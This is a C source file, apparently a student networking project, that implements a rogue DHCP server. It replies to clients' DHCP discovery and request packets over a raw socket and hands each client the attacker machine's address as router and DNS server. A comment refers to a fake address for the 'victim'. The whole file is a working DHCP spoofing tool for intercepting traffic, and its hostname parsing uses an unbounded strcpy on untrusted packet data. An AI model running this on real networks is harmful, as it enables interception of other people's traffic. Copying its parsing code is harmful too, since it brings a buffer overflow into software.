#include <linux/tcp.h>
#include <linux/udp.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include "monitor.h"

#include "dhcp.h"
#include "checksum.h"
#include "bensocket.h"

unsigned char send_buffer[350];

char *ip_str;
int ip_int;

int on;
struct ifreq ifr;
struct ifreq mac_address;
struct ifreq ip_address;
pthread_t receiver_thread, report_thread;

void fill_ethernet()
{
	struct ether_header* header;
	header  = (struct ether_header*) send_buffer;

	header->ether_type = htons(0x0800);

	for (int i = 0; i < 6; i++)
	{
		header->ether_shost[i] = mac_address.ifr_hwaddr.sa_data[i];
		header->ether_dhost[i] = eth_header->ether_shost[i];
	}
}

void fill_ip()
{
	struct iphdr* header;
	header = (struct iphdr*) (send_buffer + sizeof(struct ether_header));

	//TODO: Change this to get correct ip from machine and fake ip for victim.
	char *dst_addr="10.32.143.34";

	header->ihl = 5;
	header->version = 4;
	header->tot_len = htons(336);
	header->ttl = 16;
	header->protocol = IPPROTO_UDP;
	header->saddr = inet_addr(ip_str);
	header->daddr = inet_addr(dst_addr);
	header->check = in_cksum((unsigned short *)header, sizeof(struct iphdr));
}

void fill_udp()
{
	struct udphdr* header;
	header  = (struct udphdr*)  (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));

	header->source = htons(67);
	header->dest = htons(68);
	header->len = htons(0x13c);
	header->check = htons(0);
}

void copy_ip(unsigned char* new_ip)
{
	new_ip[0] = (ip_int >> 24) & 255;
	new_ip[1] = (ip_int >> 16) & 255;
	new_ip[2] = (ip_int >> 8) & 255;
	new_ip[3] = ip_int & 255;
}

void set_magic_cookie(unsigned char* options)
{
	options[0]=0x63;
	options[1]=0x82;
	options[2]=0x53;
	options[3]=0x63;
}

void set_dhcp_message_type(unsigned char* options, unsigned char type)
{
	options[0]=53;
	options[1]=1;
	options[2]=type;
}

void set_dhcp_server_identifier(unsigned char* options)
{
	options[0]=54;
	options[1]=4;
	copy_ip(&options[2]);
}

void set_dhcp_subnet_mask(unsigned char* options)
{
	options[0]=1;
	options[1]=4;
	options[2]=255;
	options[3]=255;
	options[4]=255;
	options[5]=0;
}

void set_dhcp_address_lease_time(unsigned char* options)
{
	options[0]=51;
	options[1]=4;
	options[2]=0;
	options[3]=1;
	options[4]=56;
	options[5]=128;
}

void set_dhcp_router(unsigned char* options)
{
	options[0]=3;
	options[1]=4;
	copy_ip(&options[2]);
}

void set_dhcp_dns(unsigned char* options)
{
	options[0]=6;
	options[1]=4;
	copy_ip(&options[2]);
}

void set_dhcp_broadcast(unsigned char* options)
{
	options[0]=28;
	options[1]=4;
	options[2]=255;
	options[3]=255;
	options[4]=255;
	options[5]=255;
}

void fill_dhcp(unsigned char type)
{
	struct dhcp_packet* header;
	header = (struct dhcp_packet*)  (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)));

	header->op = 2;
	header->htype = 1;
	header->hlen = 6;
	header->hops = 0;
	header->xid = dhcp_header->xid;
	header->secs = 0;
	header->flags = 0;

	header->ciaddr = dhcp_header->ciaddr;
	inet_aton("10.32.143.34", &header->yiaddr);
	header->siaddr = dhcp_header->siaddr;
	header->giaddr = dhcp_header->giaddr;

	for (int i = 0; i < 6; i++)
	{
		header->chaddr[i] = eth_header->ether_shost[i];
	}

	set_magic_cookie(&header->options[0]);
	set_dhcp_message_type(&header->options[4], type);
	set_dhcp_server_identifier(&header->options[7]);
	set_dhcp_subnet_mask(&header->options[13]);
	set_dhcp_address_lease_time(&header->options[19]);
	set_dhcp_router(&header->options[25]);
	set_dhcp_dns(&header->options[31]);
	set_dhcp_broadcast(&header->options[37]);
	header->options[43]=0xff;
}

void send_dhcp(unsigned char type)
{
	fill_ethernet();
	fill_ip();
	fill_udp();
	fill_dhcp(type);

	int sock;
	struct sockaddr_ll to;
	socklen_t len;
	unsigned char addr[6];

	if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)  {
		printf("Erro na criacao do socket.\n");
        exit(1);
 	}

	to.sll_protocol= htons(ETH_P_ALL);
	to.sll_halen = 6;
	to.sll_ifindex = 2; /* indice da interface pela qual os pacotes serao enviados */
	size_t i;
	for ( i = 0; i < 6; i++)
		addr[i] = eth_header->ether_shost[i];

	memcpy (to.sll_addr, addr, 6);
	len = sizeof(struct sockaddr_ll);

	sendto(sock, (char *) send_buffer, sizeof(send_buffer), 0, (struct sockaddr*) &to, len);
	close(sock);
}

void dhcp_handler()
{
	unsigned char *options = dhcp_header->options;
	int i = 4;
	while (true) {
		unsigned char type = options[i++];
		if (type == 255)
			break;
		unsigned char len = options[i++];
		if (type == 53) {
			if (options[i] == 1) {
				send_dhcp(2);
			} else if (options[i] == 3) {
				send_dhcp(5);
			}
		}
		if (type == 12) {
			hostname = malloc(len + 1);
			strcpy(hostname, (const char*)&options[i]);
			hostname[len] = '\0';
		}
		i+=len;
	}
}

void udp_handler()
{
	unsigned int port_dest = (unsigned int)ntohs(udp_header->dest);
	if (port_dest == 67)
		dhcp_handler();
}
